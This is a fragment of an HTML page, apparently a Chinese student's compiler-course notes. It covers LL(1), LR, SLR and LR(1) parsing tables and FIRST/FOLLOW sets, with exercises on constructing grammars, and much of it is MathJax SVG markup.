601Q351 704 476 704Q514 704 524 703Q621 689 680 617T740 435ZM637 476Q637 565 591 615T476 665Q396 665 322 605Q242 542 200 428T157 216Q157 126 200 73T314 19Q404 19 485 98T608 313Q637 408 637 476Z"/></g><g data-mml-node="mi" transform="translate(13811.2,0)"><path data-c="1D43F" d="M228 637Q194 637 192 641Q191 643 191 649Q191 673 202 682Q204 683 217 683Q271 680 344 680Q485 680 506 683H518Q524 677 524 674T522 656Q517 641 513 637H475Q406 636 394 628Q387 624 380 600T313 336Q297 271 279 198T252 88L243 52Q243 48 252 48T311 46H328Q360 46 379 47T428 54T478 72T522 106T564 161Q580 191 594 228T611 270Q616 273 628 273H641Q647 264 647 262T627 203T583 83T557 9Q555 4 553 3T537 0T494 -1Q483 -1 418 -1T294 0H116Q32 0 32 10Q32 17 34 24Q39 43 44 45Q48 46 59 46H65Q92 46 125 49Q139 52 144 61Q147 65 216 339T285 628Q285 635 228 637Z"/></g><g data-mml-node="mi" transform="translate(14492.2,0)"><path data-c="1D43F" d="M228 637Q194 637 192 641Q191 643 191 649Q191 673 202 682Q204 683 217 683Q271 680 344 680Q485 680 506 683H518Q524 677 524 674T522 656Q517 641 513 637H475Q406 636 394 628Q387 624 380 600T313 336Q297 271 279 198T252 88L243 52Q243 48 252 48T311 46H328Q360 46 379 47T428 54T478 72T522 106T564 161Q580 191 594 228T611 270Q616 273 628 273H641Q647 264 647 262T627 203T583 83T557 9Q555 4 553 3T537 0T494 -1Q483 -1 418 -1T294 0H116Q32 0 32 10Q32 17 34 24Q39 43 44 45Q48 46 59 46H65Q92 46 125 49Q139 52 144 61Q147 65 216 339T285 628Q285 635 228 637Z"/></g><g data-mml-node="mi" transform="translate(15173.2,0)"><path data-c="1D442" d="M740 435Q740 320 676 213T511 42T304 -22Q207 -22 138 35T51 201Q50 209 50 244Q50 346 98 438T227 601Q351 704 476 704Q514 704 524 703Q621 689 680 617T740 435ZM637 476Q637 565 591 615T476 665Q396 665 322 605Q242 542 200 428T157 216Q157 126 200 73T314 19Q404 19 485 98T608 313Q637 408 637 476Z"/></g><g data-mml-node="mi" transform="translate(15936.2,0)"><path data-c="1D44A" d="M436 683Q450 683 486 682T553 680Q604 680 638 681T677 682Q695 682 695 674Q695 670 692 659Q687 641 683 639T661 637Q636 636 621 632T600 624T597 615Q597 603 613 377T629 138L631 141Q633 144 637 151T649 170T666 200T690 241T720 295T759 362Q863 546 877 572T892 604Q892 619 873 628T831 637Q817 637 817 647Q817 650 819 660Q823 676 825 679T839 682Q842 682 856 682T895 682T949 681Q1015 681 1034 683Q1048 683 1048 672Q1048 666 1045 655T1038 640T1028 637Q1006 637 988 631T958 617T939 600T927 584L923 578L754 282Q586 -14 585 -15Q579 -22 561 -22Q546 -22 542 -17Q539 -14 523 229T506 480L494 462Q472 425 366 239Q222 -13 220 -15T215 -19Q210 -22 197 -22Q178 -22 176 -15Q176 -12 154 304T131 622Q129 631 121 633T82 637H58Q51 644 51 648Q52 671 64 683H76Q118 680 176 680Q301 680 313 683H323Q329 677 329 674T327 656Q322 641 318 637H297Q236 634 232 620Q262 160 266 136L501 550L499 587Q496 629 489 632Q483 636 447 637Q428 637 422 639T416 648Q416 650 418 660Q419 664 420 669T421 676T424 680T428 682T436 683Z"/></g><g data-mml-node="mo" transform="translate(16984.2,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"/></g><g data-mml-node="mi" transform="translate(17373.2,0)"><path data-c="1D434" d="M208 74Q208 50 254 46Q272 46 272 35Q272 34 270 22Q267 8 264 4T251 0Q249 0 239 0T205 1T141 2Q70 2 50 0H42Q35 7 35 11Q37 38 48 46H62Q132 49 164 96Q170 102 345 401T523 704Q530 716 547 716H555H572Q578 707 578 706L606 383Q634 60 636 57Q641 46 701 46Q726 46 726 36Q726 34 723 22Q720 7 718 4T704 0Q701 0 690 0T651 1T578 2Q484 2 455 0H443Q437 6 437 9T439 27Q443 40 445 43L449 46H469Q523 49 533 63L521 213H283L249 155Q208 86 208 74ZM516 260Q516 271 504 416T490 562L463 519Q447 492 400 412L310 260L413 259Q516 259 516 260Z"/></g><g data-mml-node="mo" transform="translate(18123.2,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"/></g><g data-mml-node="mo" transform="translate(18790,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"/></g><g data-mml-node="mi" transform="translate(19845.8,0)"><path data-c="2205" d="M331 696Q335 708 339 722T345 744T350 759T357 769T367 772Q374 772 381 767T388 754Q388 746 377 712L366 673L378 661Q460 575 460 344Q460 281 456 234T432 126T373 27Q319 -22 250 -22Q214 -22 180 -7Q168 -3 168 -4L159 -33Q148 -71 142 -75Q138 -78 132 -78Q124 -78 118 -72T111 -60Q111 -52 122 -18L133 21L125 29Q39 111 39 344Q39 596 137 675Q187 716 251 716Q265 716 278 714T296 710T315 703T331 696ZM276 676Q264 679 246 679Q196 679 159 631Q134 597 128 536T121 356Q121 234 127 174T151 80L234 366Q253 430 275 506T308 618L318 654Q318 656 294 669L276 676ZM181 42Q207 16 250 16Q291 16 324 47Q354 78 366 136T378 356Q378 470 372 528T349 616L348 613Q348 611 264 326L181 42Z"/></g></g></g></svg></mjx-container></li>
</ul>
</li>
<li><p>算法基本思想</p>
<ul>
<li>表驱动的分析算法</li>
</ul>
</li>
<li><pre><code class="LL(1)文法">0：S-&gt;N V N
1：N-&gt;s
2：  |t
3：  |g
4：  |w
5：V-&gt;e
6：  |d
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">  - LL(1)分析表</span><br><span class="line"></span><br><span class="line">    | N\T  | s    | t    | g    | w    | e    | d    |</span><br><span class="line">    | ---- | ---- | ---- | ---- | ---- | ---- | ---- |</span><br><span class="line">    | S    | 0    | 0    | 0    | 0    |      |      |</span><br><span class="line">    | N    | 1    | 2    | 3    | 4    |      |      |</span><br><span class="line">    | V    |      |      |      |      | 5    | 6    |</span><br><span class="line"></span><br><span class="line">- LL(1)分析表中的冲突</span><br><span class="line"></span><br><span class="line">  ```含冲突表</span><br><span class="line">  0：S-&gt;N V N</span><br><span class="line">  1：N-&gt;s</span><br><span class="line">  2：  |t</span><br><span class="line">  3：  |g</span><br><span class="line">  4：  |w</span><br><span class="line">  5：  |w V</span><br><span class="line">  6：V-&gt;e</span><br><span class="line">  7：  |d</span><br></pre></td></tr></table></figure></div>

- LL(1)含冲突的分析表

  | N\T  | s    | t    | g    | w    | e    | d    |
  | :--: | ---- | ---- | ---- | ---- | ---- | ---- |
  |  S   | 0    | 0    | 0    | 0    |      |      |
  |  N   | 1    | 2    | 3    | 4,5  |      |      |
  |  V   |      |      |      |      | 5    | 6    |

- 冲突的检测：

  - 对N的两条产生式规则N-&gt;β和N-&gt;γ，要求FIRST(β)∩FIRST(γ)=\{\}
</code></pre>
</li>
<li><p><strong>构造预测分析表（利用FIRST集合和FOLLOW集合）</strong></p>
<ul>
<li><p>对文法的每个产生式A-&gt;α</p>
</li>
<li><p>步骤1：对FIRST(α)的每个终结符α，把A-&gt;α加入M[A,α]</p>
</li>
<li><p>步骤2：若ɛ在FIRST(α)中，对FOLLOW(A)中每个终结符b(包含$),加入A-&gt;α加入M[A,b]</p>
</li>
<li><p>例：</p>
<ul>
<li><p>1:E-&gt;TE’</p>
</li>
<li><p>2:E’-&gt;+TE’</p>
</li>
<li><p>3:E’-&gt;ɛ</p>
</li>
<li><p>4:T-&gt;FT’</p>
</li>
<li><p>5:T’-&gt;*FT’</p>
</li>
<li><p>6:T’-&gt;ɛ</p>
</li>
<li><p>7:F-&gt;(E)</p>
</li>
<li><p>8:F-&gt;id</p>
<ul>
<li>FIRST(E)=FIRST(TE’)=FIRST(T)=FIRST(F)={(,id}</li>
<li>FIRST(E’)={+,ɛ}</li>
<li>FIRST(T’)={*,ɛ}</li>
<li>FOLLOW(E)=FOLLOW(E’)={),$}</li>
<li>FOLLOW(T)=FOLLOW(T’)={+,),$}</li>
<li>FOLLOW(F)={+,*,),$}</li>
</ul>
</li>
<li><p>预测分析表</p>
<ul>
<li><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/%E9%A2%84%E6%B5%8B%E5%88%86%E6%9E%90%E8%A1%A8.png" alt="预测分析表"></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="自底向上分析算法："><a href="#自底向上分析算法：" class="headerlink" title="自底向上分析算法："></a><strong>自底向上分析算法：</strong></h3><ul>
<li><strong>LR分析算法（移进-归约算法）</strong></li>
<li>目前应用最广泛的一类语法分析器自动生成器中采用的算法</li>
<li>自底向上分析的基本思想：最右推导的逆过程</li>
<li>引入点记符<ul>
<li><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/%E7%82%B9%E8%AE%B0%E7%AC%A6.png" alt="点记符"></li>
</ul>
</li>
<li>两个重要步骤：<ul>
<li>移进：一个记号到栈顶上</li>
<li>归约：可以把归约过程看成把输入串归约成文法的开始符号<ul>
<li>文法<ul>
<li>S-&gt;aABe</li>
<li>A-&gt;Abc|b</li>
<li>B-&gt;d<ul>
<li>将句子abbcde归约成S</li>
<li>归约序列：abbcde,aAbcde,aAde,aABe,S</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="LL-1-文法"><a href="#LL-1-文法" class="headerlink" title="LL(1)文法"></a><strong>LL(1)文法</strong></h3><p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/LL(1)%E6%96%87%E6%B3%95%E5%88%A4%E6%96%AD.png"></p>
<h3 id="LL-1-文法判断"><a href="#LL-1-文法判断" class="headerlink" title="LL(1)文法判断"></a><strong>LL(1)文法判断</strong></h3><p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/LL(1)%E6%96%87%E6%B3%95%E5%88%A4%E6%96%AD_1.png" alt="LL(1)文法判断_1"></p>
<p>LR(0)分析表</p>
<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/LR(0)%E5%88%86%E6%9E%90.png" alt="LR(0)分析"></p>
<h3 id="SLR算法："><a href="#SLR算法：" class="headerlink" title="SLR算法："></a><strong>SLR算法：</strong></h3><p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/SLR%E5%88%86%E6%9E%90%E8%A1%A8.png" alt="SLR分析表"></p>
<h3 id="LR-1"><a href="#LR-1" class="headerlink" title="LR(1)"></a><strong>LR(1)</strong></h3><p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/LR(1).png" alt="LR(1)"></p>
<h3 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h3><p><strong>例题1：</strong>试着构造下列语言的文法</p>
<ul>
<li><p><mjx-container class="MathJax" jax="SVG" display="true"><svg style="vertical-align: -0.564ex;" xmlns="http://www.w3.org/2000/svg" width="12.358ex" height="2.26ex" role="img" focusable="false" viewbox="0 -749.5 5462.1 999"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="TeXAtom" data-mjx-texclass="ORD"><g data-mml-node="msup"><g data-mml-node="mi"><path data-c="1D44E" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z"/></g><g data-mml-node="mi" transform="translate(562,413) scale(0.707)"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"/></g></g><g data-mml-node="msup" transform="translate(1036.3,0)"><g data-mml-node="mi"><path data-c="1D44F" d="M73 647Q73 657 77 670T89 683Q90 683 161 688T234 694Q246 694 246 685T212 542Q204 508 195 472T180 418L176 399Q176 396 182 402Q231 442 283 442Q345 442 383 396T422 280Q422 169 343 79T173 -11Q123 -11 82 27T40 150V159Q40 180 48 217T97 414Q147 611 147 623T109 637Q104 637 101 637H96Q86 637 83 637T76 640T73 647ZM336 325V331Q336 405 275 405Q258 405 240 397T207 376T181 352T163 330L157 322L136 236Q114 150 114 114Q114 66 138 42Q154 26 178 26Q211 26 245 58Q270 81 285 114T318 219Q336 291 336 325Z"/></g><g data-mml-node="mi" transform="translate(462,413) scale(0.707)"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"/></g></g><g data-mml-node="mo" transform="translate(1972.5,0) translate(0 -0.5)"><path data-c="7C" d="M139 -249H137Q125 -249 119 -235V251L120 737Q130 750 139 750Q152 750 159 735V-235Q151 -249 141 -249H139Z"/></g><g data-mml-node="mi" transform="translate(2250.5,0)"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"/></g><g data-mml-node="mo" transform="translate(3128.3,0)"><g data-mml-node="text"><path data-c="3E" d="M84 520Q84 528 88 533T96 539L99 540Q106 540 253 471T544 334L687 265Q694 260 694 250T687 235Q685 233 395 96L107 -40H101Q83 -38 83 -20Q83 -19 83 -17Q82 -10 98 -1Q117 9 248 71Q326 108 378 132L626 250L378 368Q90 504 86 509Q84 513 84 520Z"/></g><g data-mml-node="text" transform="translate(778,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"/></g></g><g data-mml-node="mn" transform="translate(4962.1,0)"><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z"/></g></g></g></g></svg></mjx-container>               </p>
<blockquote>
<p>G={N,T,P,S}</p>
<p>N={S}</p>
<p>T={a,b}</p>
<p>P={S-&gt;ɛ|ab|aSb}</p>
</blockquote>
</li>
<li><p><mjx-container class="MathJax" jax="SVG" display="true"><svg style="vertical-align: -0.452ex;" xmlns="http://www.w3.org/2000/svg" width="39.367ex" height="2.149ex" role="img" focusable="false" viewbox="0 -750 17400 950"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="merror" data-mjx-error="You can't use 'macro parameter character #' in math mode" title="You can't use 'macro parameter character #' in math mode"><rect data-background="true" width="17400" height="950" y="-200"/><title>You can't use 'macro parameter character #' in math mode</title><g data-mml-node="mtext" style="font-family: serif;"><text data-variant="-explicitFont" transform="scale(1,-1)" font-size="884px">{a^n#b^n|n&gt;=0}∪{c^n#d^n|n&gt;=0}</text></g></g></g></g></svg></mjx-container>     </p>
<blockquote>
<p>G={N,T,P,S}</p>
<p>N={S,X,Y}</p>
<p>T={a,b,c,#,d}</p>
<p>P={S-&gt;X|Y ,X-&gt;#|aXb,Y-&gt;#|cYd}    </p>
</blockquote>
</li>
<li><p><mjx-container class="MathJax" jax="SVG" display="true"><svg style="vertical-align: -0.564ex;" xmlns="http://www.w3.org/2000/svg" width="19.911ex" height="2.26ex" role="img" focusable="false" viewbox="0 -749.5 8800.7 999"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="TeXAtom" data-mjx-texclass="ORD"><g data-mml-node="msup"><g data-mml-node="mi"><path data-c="1D44E" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z"/></g><g data-mml-node="mi" transform="translate(562,413) scale(0.707)"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"/></g></g><g data-mml-node="msup" transform="translate(1036.3,0)"><g data-mml-node="mi"><path data-c="1D44F" d="M73 647Q73 657 77 670T89 683Q90 683 161 688T234 694Q246 694 246 685T212 542Q204 508 195 472T180 418L176 399Q176 396 182 402Q231 442 283 442Q345 442 383 396T422 280Q422 169 343 79T173 -11Q123 -11 82 27T40 150V159Q40 180 48 217T97 414Q147 611 147 623T109 637Q104 637 101 637H96Q86 637 83 637T76 640T73 647ZM336 325V331Q336 405 275 405Q258 405 240 397T207 376T181 352T163 330L157 322L136 236Q114 150 114 114Q114 66 138 42Q154 26 178 26Q211 26 245 58Q270 81 285 114T318 219Q336 291 336 325Z"/></g><g data-mml-node="mi" transform="translate(462,413) scale(0.707)"><path data-c="1D45A" d="M21 287Q22 293 24 303T36 341T56 388T88 425T132 442T175 435T205 417T221 395T229 376L231 369Q231 367 232 367L243 378Q303 442 384 442Q401 442 415 440T441 433T460 423T475 411T485 398T493 385T497 373T500 364T502 357L510 367Q573 442 659 442Q713 442 746 415T780 336Q780 285 742 178T704 50Q705 36 709 31T724 26Q752 26 776 56T815 138Q818 149 821 151T837 153Q857 153 857 145Q857 144 853 130Q845 101 831 73T785 17T716 -10Q669 -10 648 17T627 73Q627 92 663 193T700 345Q700 404 656 404H651Q565 404 506 303L499 291L466 157Q433 26 428 16Q415 -11 385 -11Q372 -11 364 -4T353 8T350 18Q350 29 384 161L420 307Q423 322 423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 181Q151 335 151 342Q154 357 154 369Q154 405 129 405Q107 405 92 377T69 316T57 280Q55 278 41 278H27Q21 284 21 287Z"/></g></g><g data-mml-node="msup" transform="translate(2169.1,0)"><g data-mml-node="mi"><path data-c="1D450" d="M34 159Q34 268 120 355T306 442Q362 442 394 418T427 355Q427 326 408 306T360 285Q341 285 330 295T319 325T330 359T352 380T366 386H367Q367 388 361 392T340 400T306 404Q276 404 249 390Q228 381 206 359Q162 315 142 235T121 119Q121 73 147 50Q169 26 205 26H209Q321 26 394 111Q403 121 406 121Q410 121 419 112T429 98T420 83T391 55T346 25T282 0T202 -11Q127 -11 81 37T34 159Z"/></g><g data-mml-node="mi" transform="translate(466,413) scale(0.707)"><path data-c="1D45D" d="M23 287Q24 290 25 295T30 317T40 348T55 381T75 411T101 433T134 442Q209 442 230 378L240 387Q302 442 358 442Q423 442 460 395T497 281Q497 173 421 82T249 -10Q227 -10 210 -4Q199 1 187 11T168 28L161 36Q160 35 139 -51T118 -138Q118 -144 126 -145T163 -148H188Q194 -155 194 -157T191 -175Q188 -187 185 -190T172 -194Q170 -194 161 -194T127 -193T65 -192Q-5 -192 -24 -194H-32Q-39 -187 -39 -183Q-37 -156 -26 -148H-6Q28 -147 33 -136Q36 -130 94 103T155 350Q156 355 156 364Q156 405 131 405Q109 405 94 377T71 316T59 280Q57 278 43 278H29Q23 284 23 287ZM178 102Q200 26 252 26Q282 26 310 49T356 107Q374 141 392 215T411 325V331Q411 405 350 405Q339 405 328 402T306 393T286 380T269 365T254 350T243 336T235 326L232 322Q232 321 229 308T218 264T204 212Q178 106 178 102Z"/></g></g><g data-mml-node="mo" transform="translate(3040.8,0) translate(0 -0.5)"><path data-c="7C" d="M139 -249H137Q125 -249 119 -235V251L120 737Q130 750 139 750Q152 750 159 735V-235Q151 -249 141 -249H139Z"/></g><g data-mml-node="mi" transform="translate(3318.8,0)"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"/></g><g data-mml-node="mo" transform="translate(3918.8,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"/></g><g data-mml-node="mi" transform="translate(4363.4,0)"><path data-c="1D45A" d="M21 287Q22 293 24 303T36 341T56 388T88 425T132 442T175 435T205 417T221 395T229 376L231 369Q231 367 232 367L243 378Q303 442 384 442Q401 442 415 440T441 433T460 423T475 411T485 398T493 385T497 373T500 364T502 357L510 367Q573 442 659 442Q713 442 746 415T780 336Q780 285 742 178T704 50Q705 36 709 31T724 26Q752 26 776 56T815 138Q818 149 821 151T837 153Q857 153 857 145Q857 144 853 130Q845 101 831 73T785 17T716 -10Q669 -10 648 17T627 73Q627 92 663 193T700 345Q700 404 656 404H651Q565 404 506 303L499 291L466 157Q433 26 428 16Q415 -11 385 -11Q372 -11 364 -4T353 8T350 18Q350 29 384 161L420 307Q423 322 423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 181Q151 335 151 342Q154 357 154 369Q154 405 129 405Q107 405 92 377T69 316T57 280Q55 278 41 278H27Q21 284 21 287Z"/></g><g data-mml-node="mo" transform="translate(5241.4,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"/></g><g data-mml-node="mi" transform="translate(5686.1,0)"><path data-c="1D45D" d="M23 287Q24 290 25 295T30 317T40 348T55 381T75 411T101 433T134 442Q209 442 230 378L240 387Q302 442 358 442Q423 442 460 395T497 281Q497 173 421 82T249 -10Q227 -10 210 -4Q199 1 187 11T168 28L161 36Q160 35 139 -51T118 -138Q118 -144 126 -145T163 -148H188Q194 -155 194 -157T191 -175Q188 -187 185 -190T172 -194Q170 -194 161 -194T127 -193T65 -192Q-5 -192 -24 -194H-32Q-39 -187 -39 -183Q-37 -156 -26 -148H-6Q28 -147 33 -136Q36 -130 94 103T155 350Q156 355 156 364Q156 405 131 405Q109 405 94 377T71 316T59 280Q57 278 43 278H29Q23 284 23 287ZM178 102Q200 26 252 26Q282 26 310 49T356 107Q374 141 392 215T411 325V331Q411 405 350 405Q339 405 328 402T306 393T286 380T269 365T254 350T243 336T235 326L232 322Q232 321 229 308T218 264T204 212Q178 106 178 102Z"/></g><g data-mml-node="mo" transform="translate(6466.9,0)"><g data-mml-node="text"><path data-c="3E" d="M84 520Q84 528 88 533T96 539L99 540Q106 540 253 471T544 334L687 265Q694 260 694 250T687 235Q685 233 395 96L107 -40H101Q83 -38 83 -20Q83 -19 83 -17Q82 -10 98 -1Q117 9 248 71Q326 108 378 132L626 250L378 368Q90 504 86 509Q84 513 84 520Z"/></g><g data-mml-node="text" transform="translate(778,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"/></g></g><g data-mml-node="mn" transform="translate(8300.7,0)"><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z"/></g></g></g></g></svg></mjx-container> </p>
<blockquote>
<p>G={N,T,P,S}</p>
<p>N={S,Y,Z}</p>
<p>T={a,b,c}</p>
<p>P={S-&gt;ɛ|aS|Y,Y-&gt;ɛ|bY|Z,Z-&gt;ɛ|cZ}   </p>
</blockquote>
</li>
<li><p><mjx-container class="MathJax" jax="SVG" display="true"><svg style="vertical-align: -0.564ex;" xmlns="http://www.w3.org/2000/svg" width="22.274ex" height="2.261ex" role="img" focusable="false" viewbox="0 -750 9844.9 999.5"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="TeXAtom" data-mjx-texclass="ORD"><g data-mml-node="msup"><g data-mml-node="mi"><path data-c="1D44E" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z"/></g><g data-mml-node="mi" transform="translate(562,413) scale(0.707)"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 